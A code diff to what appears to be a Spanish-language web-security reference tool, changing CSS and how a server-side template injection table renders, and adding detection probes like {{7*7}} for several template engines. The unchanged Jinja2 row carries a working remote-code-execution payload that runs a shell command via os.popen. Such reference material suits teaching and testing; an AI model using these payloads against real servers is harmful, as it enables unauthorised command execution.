@@ -343,11 +343,7 @@ tr.svc-open-row td{background:rgba(0,170,255,.08);}
 .wv-eng-table td{padding:6px 10px;border-bottom:1px solid var(--border);color:var(--text2);}
 .wv-eng-table td:first-child{color:var(--orange);}
 .wv-eng-table tr:hover td{background:var(--bg3);}
-.wv-rce summary{cursor:pointer;color:var(--cyan);font-size:10px;list-style:none;white-space:nowrap;}
-.wv-rce summary::-webkit-details-marker{display:none;}
-.wv-rce summary::before{content:'▸ ';}
-.wv-rce[open] summary::before{content:'▾ ';}
-.wv-rce code{display:block;margin-top:4px;color:var(--orange);white-space:pre-wrap;word-break:break-all;font-size:10px;}
+.wv-rce-code{display:block;color:var(--orange);white-space:pre-wrap;word-break:break-all;font-size:10px;}
 .wv-files{display:flex;flex-wrap:wrap;gap:6px;}
 .wv-file-chip{font-family:var(--mono);font-size:11px;color:var(--orange);background:var(--bg);border:1px solid var(--border);border-radius:var(--r);padding:3px 8px;cursor:pointer;}
 .wv-file-chip:hover{border-color:var(--orange);}
@@ -4691,16 +4687,16 @@ const WEB_VULNS=[
     detection:`Inyectar el polyglot \${{<%[%'"}}%\\ para provocar error, luego probar {{7*7}} — si la respuesta muestra 49, hay evaluación de plantilla.`,
     engineTable:[
       {lang:'Python',  engine:'Jinja2',     payload:'{{7*7}}',    result:'49', rce:`{{namespace.__init__.__globals__.os.popen('id').read()}}`},
-      {lang:'Python',  engine:'Mako',       payload:'',           result:'',   rce:''},
-      {lang:'PHP',     engine:'Twig',       payload:'',           result:'',   rce:''},
-      {lang:'PHP',     engine:'Smarty',     payload:'',           result:'',   rce:''},
-      {lang:'Java',    engine:'FreeMarker', payload:'',           result:'',   rce:''},
-      {lang:'Java',    engine:'Velocity',   payload:'',           result:'',   rce:''},
-      {lang:'Java',    engine:'Thymeleaf',  payload:'[[${7*7}]]', result:'49', rce:''},
-      {lang:'Ruby',    engine:'ERB',        payload:'<%= 7*7 %>', result:'49', rce:''},
-      {lang:'Node.js', engine:'EJS',        payload:'',           result:'',   rce:''},
-      {lang:'Node.js', engine:'Pug',        payload:'',           result:'',   rce:''},
-      {lang:'Node.js', engine:'Handlebars', payload:'',           result:'',   rce:''},
+      {lang:'Python',  engine:'Mako',       payload:'${7*7}',         result:'49', rce:''},
+      {lang:'PHP',     engine:'Twig',       payload:'{{7*7}}',        result:'49', rce:''},
+      {lang:'PHP',     engine:'Smarty',     payload:'{7*7}',          result:'49', rce:''},
+      {lang:'Java',    engine:'FreeMarker', payload:'${7*7}',         result:'49', rce:''},
+      {lang:'Java',    engine:'Velocity',   payload:'#set($x=7*7)$x', result:'49', rce:''},
+      {lang:'Java',    engine:'Thymeleaf',  payload:'[[${7*7}]]',     result:'49', rce:''},
+      {lang:'Ruby',    engine:'ERB',        payload:'<%= 7*7 %>',     result:'49', rce:''},
+      {lang:'Node.js', engine:'EJS',        payload:'<%= 7*7 %>',     result:'49', rce:''},
+      {lang:'Node.js', engine:'Pug',        payload:'#{7*7}',         result:'49', rce:''},
+      {lang:'Node.js', engine:'Handlebars', payload:'',               result:'',   rce:''},
       {lang:'.NET',    engine:'Razor',      payload:'@(7*7)',     result:'49', rce:''},
     ],
   },
@@ -4960,7 +4956,7 @@ function openWebVuln(id){
   if(v.engineTable){
     html+=`<div class="wv-sec"><div class="wv-sec-title det">Motores de plantillas</div>
       <table class="wv-eng-table"><thead><tr><th>Lenguaje</th><th>Motor</th><th>Payload de prueba</th><th>Resultado</th><th>Payload real (RCE)</th></tr></thead><tbody>
-      ${v.engineTable.map(r=>`<tr><td>${esc(r.lang)}</td><td>${esc(r.engine)}</td><td>${r.payload?esc(r.payload):'<span style="color:var(--text3)">—</span>'}</td><td>${r.result?esc(r.result):'<span style="color:var(--text3)">—</span>'}</td><td>${r.rce?`<details class="wv-rce"><summary>Ver RCE</summary><code>${esc(r.rce)}</code></details>`:'<span style="color:var(--text3)">—</span>'}</td></tr>`).join('')}
+      ${v.engineTable.map(r=>`<tr><td>${esc(r.lang)}</td><td>${esc(r.engine)}</td><td>${r.payload?esc(r.payload):'<span style="color:var(--text3)">—</span>'}</td><td>${r.result?esc(r.result):'<span style="color:var(--text3)">—</span>'}</td><td>${r.rce?`<code class="wv-rce-code">${esc(r.rce)}</code>`:'<span style="color:var(--text3)">—</span>'}</td></tr>`).join('')}
       </tbody></table></div>`;
   }
 
